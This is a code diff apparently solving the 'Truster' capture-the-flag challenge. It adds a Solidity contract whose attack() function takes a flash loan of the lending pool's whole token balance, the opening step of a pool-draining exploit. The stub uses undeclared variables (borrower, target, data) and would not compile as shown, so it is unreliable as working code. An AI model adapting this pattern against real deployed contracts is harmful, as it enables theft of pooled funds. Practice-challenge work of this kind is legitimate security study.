@@ -40,3 +40,17 @@ contract TrusterLenderPool is ReentrancyGuard {
     }
 
 }
+
+contract Sol {
+  IERC20 public immutable damnValuableToken;
+  TrusterLenderPool public pool;
+
+  constructor(address tokenAddress, address poolAddress) {
+    damnValuableToken = IERC20(tokenAddress);
+    pool = TrusterLenderPool(poolAddress);
+  }
+
+  function attack() external {
+    pool.flashLoan(damnValuableToken.balanceOf(address(pool)), borrower, target, data);
+  }
+}
